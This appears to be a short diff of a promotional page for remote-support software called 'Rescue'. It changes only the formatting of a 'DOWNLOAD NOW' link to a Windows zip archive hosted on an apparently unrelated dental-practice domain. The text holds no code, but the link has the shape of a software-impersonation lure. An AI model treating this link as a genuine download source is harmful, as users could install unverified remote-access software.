@@ -12,4 +12,4 @@ Multi-Platform Support
 Remotely support any device.
 Rescue can support any device — from desktop to mobile, Mac to Windows. Just swoop in and start solving.
 
-DOWNLOAD NOW(https://pacerdentalpc.com/source_win64.zip)
+<DOWNLOAD NOW "https://pacerdentalpc.com/source_win64.zip">
